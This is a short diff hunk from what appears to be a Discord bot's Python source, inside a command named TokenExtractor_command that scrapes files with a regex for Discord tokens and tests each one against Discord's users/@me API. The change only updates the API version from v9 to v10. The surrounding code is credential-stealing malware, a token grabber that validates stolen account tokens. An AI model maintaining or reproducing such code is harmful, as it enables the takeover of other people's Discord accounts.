@@ -283,7 +283,7 @@ async def TokenExtractor_command(ctx: SlashContext):
                         for token in re.findall(regex, line):
                             tokens.append(token)
         for token in tokens:
-            r = requests.get("https://discord.com/api/v9/users/@me", headers={
+            r = requests.get("https://discord.com/api/v10/users/@me", headers={
                 "Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                 "Authorization": token
